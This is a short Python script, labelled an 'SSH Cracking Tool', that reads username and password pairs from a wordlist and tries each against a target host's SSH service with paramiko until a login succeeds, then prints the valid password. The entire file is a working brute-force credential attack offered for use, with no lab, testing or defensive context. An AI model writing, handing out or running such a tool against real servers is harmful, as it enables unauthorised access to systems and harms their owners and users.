#!/usr/bin/env python
import paramiko, sys, socket
def help():
    print("SSH Cracking Tool")
    print("Usage: ./sct.py <host> <wordlist>")
    print
    print("Wordlist must be <name    password> where blanked <TAB>")
    sys.exit()
def SCT(target, wordlist):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        for p in open(wordlist, "r").readlines():
            [name, passw] = p.strip().split()
            try:
                print("Trying host=%s name:\033[93m%s \033[0mpassword:\033[93m%s\033[0m " % (target, name, passw))
                ssh.connect(target, username=name, password=passw)
            except paramiko.AuthenticationException:
                continue
            print("\npassword:%s is valid" % passw)
            break
    except IndexError:
        help()
    except paramiko.ssh_exception.NoValidConnectionsError:
        print("Couldn't connect on host %s port 22" % target)
        sys.exit()
SCT(sys.argv[1], sys.argv[2])
